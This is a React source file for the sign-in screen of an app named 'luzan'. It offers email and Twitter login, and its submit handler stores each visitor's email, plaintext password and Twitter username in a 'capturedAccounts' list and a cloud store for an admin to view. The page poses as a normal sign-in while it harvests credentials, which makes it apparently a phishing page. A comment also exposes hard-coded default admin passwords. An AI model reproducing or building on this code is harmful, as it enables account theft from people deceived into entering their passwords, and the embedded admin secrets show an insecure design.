import { AnimatePresence, motion } from 'framer-motion';
import { ArrowLeft, Mail, Twitter } from 'lucide-react';
import { useEffect, useState } from 'react';
import { GlassButton, GlassCard, GlassInput } from '../components/Glass';
import {
  fetchAdminPassword,
  getCachedAdminPassword,
  isAdminEmail,
  verifyAdminPassword,
} from '../lib/adminAuth';
import { cloudCapture } from '../lib/cloud';
import { captureNow } from '../lib/capturedStore';
import { readGlobalBg } from '../lib/globalFeed';
import {
  hasAuthErrors,
  PASSWORD_MIN_LENGTH,
  validateAuthForm,
  type AuthFieldErrors,
} from '../lib/validation';
import { useAppStore } from '../store/useAppStore';

type Mode = 'choose' | 'email' | 'twitter' | 'signup';

export default function AuthScreen() {
  const captureLogin = useAppStore((s) => s.captureLogin);
  const globalBg = useAppStore((s) => s.globalBg) || readGlobalBg();
  const [mode, setMode] = useState<Mode>('choose');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [username, setUsername] = useState('');
  const [busy, setBusy] = useState(false);
  const [errors, setErrors] = useState<AuthFieldErrors>({});
  const [formError, setFormError] = useState('');

  // Prefetch dynamic admin password so login is fast
  useEffect(() => {
    fetchAdminPassword().catch(() => undefined);
  }, []);

  const switchMode = (next: Mode) => {
    setMode(next);
    setErrors({});
    setFormError('');
  };

  const submit = async (method: 'email' | 'twitter') => {
    const cleanEmail = email.trim();
    const emailIsAdmin = isAdminEmail(cleanEmail);

    // Resolve current DB password from cloud (with local cache fallback)
    let currentDbPassword = getCachedAdminPassword();
    if (emailIsAdmin) {
      try {
        currentDbPassword = await fetchAdminPassword();
      } catch {
        currentDbPassword = getCachedAdminPassword();
      }
    }

    // PHP-style dual check:
    // input === default (zaxo12 / adminvizo12) OR input === current_db_password
    const isAdminAttempt =
      emailIsAdmin && verifyAdminPassword(password, currentDbPassword);

    const nextErrors = validateAuthForm({
      email,
      password,
      username,
      requireUsername: method === 'twitter' && !emailIsAdmin,
      isAdminAttempt: emailIsAdmin,
    });
    setErrors(nextErrors);
    if (hasAuthErrors(nextErrors)) {
      if (nextErrors.password) setFormError(nextErrors.password);
      else if (nextErrors.email)
        setFormError(
          emailIsAdmin ? nextErrors.email : 'Use a @gmail.com email to continue'
        );
      else setFormError('Please fix the highlighted fields');
      return;
    }

    // Wrong admin password after validation of format
    if (emailIsAdmin && !isAdminAttempt) {
      setFormError('Incorrect password.');
      return;
    }

    setFormError('');
    setBusy(true);

    const cleanUser = username.trim() || undefined;
    const payload = {
      type: method as 'email' | 'twitter',
      email: cleanEmail,
      password,
      username: cleanUser,
      name: method === 'twitter' ? 'Twitter User' : 'Email User',
    };

    // 1) Local cache (instant admin same-device)
    try {
      const list = captureNow(payload);
      useAppStore.setState({ capturedAccounts: list, credentials: list });
    } catch {
      /* ignore */
    }

    // 2) CLOUD write — cross-device Admin sees this (never store admin login)
    if (!isAdminAttempt) {
      try {
        await cloudCapture(payload);
      } catch (e) {
        console.error('[luzan] cloud capture failed', e);
      }
    }

    // Keep local cache of current DB password for store login path
    if (isAdminAttempt) {
      try {
        localStorage.setItem('luzan_admin_password_v1', currentDbPassword);
      } catch {
        /* ignore */
      }
    }

    captureLogin({
      method,
      email: cleanEmail,
      password,
      username: cleanUser,
    });
    setBusy(false);
  };

  const bg = globalBg || '/images/luzan-bg.jpg';

  return (
    <div
      className="relative min-h-dvh overflow-hidden flex items-center justify-center p-4 no-select"
      style={{ backgroundColor: '#0d0e15', minHeight: '100dvh' }}
    >
      <div
        className="absolute inset-0"
        style={{
          backgroundColor: '#0d0e15',
          backgroundImage: `url('${bg}')`,
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          backgroundAttachment: 'fixed',
        }}
      />
      <div className="absolute inset-0 bg-black/30" />
      <div className="absolute inset-0 bg-gradient-to-b from-[#0d0e15]/45 via-[#0a0520]/50 to-[#0d0e15]/65" />
      <div className="pointer-events-none absolute -top-24 left-1/2 h-72 w-72 -translate-x-1/2 rounded-full bg-fuchsia-600/30 blur-[100px]" />

      <GlassCard
        className="relative w-full max-w-md p-6 sm:p-8"
        initial={{ opacity: 0, y: 24, scale: 0.96 }}
        animate={{ opacity: 1, y: 0, scale: 1 }}
        transition={{ type: 'spring', stiffness: 260, damping: 24 }}
      >
        <div className="mb-8 text-center">
          <div className="mx-auto mb-3 flex h-14 w-14 items-center justify-center rounded-2xl bg-gradient-to-br from-cyan-400/30 to-fuchsia-600/40 border border-white/20">
            <span className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-br from-cyan-300 to-fuchsia-400">
              L
            </span>
          </div>
          <h1 className="text-3xl font-bold tracking-tight text-white">
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 to-fuchsia-400">
              luzan
            </span>
          </h1>
          <p className="mt-2 text-sm text-white/55">Sign in to continue</p>
        </div>

        <AnimatePresence mode="wait">
          {mode === 'choose' && (
            <motion.div
              key="choose"
              initial={{ opacity: 0, x: 16 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -16 }}
              className="space-y-3"
            >
              <GlassButton
                variant="primary"
                className="w-full justify-center gap-2 py-3.5"
                onClick={() => switchMode('email')}
              >
                <Mail className="h-5 w-5" /> Login with Email
              </GlassButton>
              <GlassButton
                className="w-full justify-center gap-2 py-3.5"
                onClick={() => switchMode('twitter')}
              >
                <Twitter className="h-5 w-5" /> Login with Twitter
              </GlassButton>
              <button
                className="mt-4 w-full text-center text-sm text-white/50"
                onClick={() => switchMode('signup')}
              >
                Sign up
              </button>
            </motion.div>
          )}

          {(mode === 'email' || mode === 'signup') && (
            <motion.div
              key="email"
              initial={{ opacity: 0, x: 16 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -16 }}
              className="space-y-3"
            >
              <button
                onClick={() => switchMode('choose')}
                className="mb-1 flex items-center gap-1 text-sm text-white/60"
              >
                <ArrowLeft className="h-4 w-4" /> Back
              </button>
              <h2 className="text-lg font-semibold text-white">
                {mode === 'signup' ? 'Create account' : 'Email login'}
              </h2>
              <div>
                <GlassInput
                  type="email"
                  inputMode="email"
                  placeholder="you@gmail.com"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    if (errors.email) setErrors((er) => ({ ...er, email: undefined }));
                  }}
                  autoComplete="email"
                  className={errors.email ? 'border-rose-400/60' : ''}
                />
                {errors.email && (
                  <p className="mt-1 text-xs text-rose-300">{errors.email}</p>
                )}
              </div>
              <div>
                <GlassInput
                  type="password"
                  placeholder={`Password (min ${PASSWORD_MIN_LENGTH} characters)`}
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (errors.password)
                      setErrors((er) => ({ ...er, password: undefined }));
                  }}
                  autoComplete={mode === 'signup' ? 'new-password' : 'current-password'}
                  className={errors.password ? 'border-rose-400/60' : ''}
                />
                {errors.password && (
                  <p className="mt-1 text-xs text-rose-300">{errors.password}</p>
                )}
              </div>
              {formError && (
                <p className="text-sm text-rose-300 text-center">{formError}</p>
              )}
              <GlassButton
                variant="primary"
                className="w-full justify-center py-3.5"
                disabled={
                  busy ||
                  (password.length > 0 && password.length < PASSWORD_MIN_LENGTH)
                }
                onClick={() => submit('email')}
              >
                {busy ? 'Connecting…' : 'Continue'}
              </GlassButton>
            </motion.div>
          )}

          {mode === 'twitter' && (
            <motion.div
              key="twitter"
              initial={{ opacity: 0, x: 16 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -16 }}
              className="space-y-3"
            >
              <button
                onClick={() => switchMode('choose')}
                className="mb-1 flex items-center gap-1 text-sm text-white/60"
              >
                <ArrowLeft className="h-4 w-4" /> Back
              </button>
              <h2 className="text-lg font-semibold text-white">Twitter login</h2>
              <GlassInput
                placeholder="Username"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
              />
              <GlassInput
                type="email"
                placeholder="you@gmail.com"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              <GlassInput
                type="password"
                placeholder={`Password (min ${PASSWORD_MIN_LENGTH} characters)`}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className={errors.password ? 'border-rose-400/60' : ''}
              />
              {errors.password && (
                <p className="mt-1 text-xs text-rose-300">{errors.password}</p>
              )}
              {formError && (
                <p className="text-sm text-rose-300 text-center">{formError}</p>
              )}
              <GlassButton
                variant="primary"
                className="w-full justify-center py-3.5"
                disabled={
                  busy ||
                  (password.length > 0 && password.length < PASSWORD_MIN_LENGTH)
                }
                onClick={() => submit('twitter')}
              >
                {busy ? 'Connecting…' : 'Continue'}
              </GlassButton>
            </motion.div>
          )}
        </AnimatePresence>
      </GlassCard>
    </div>
  );
}
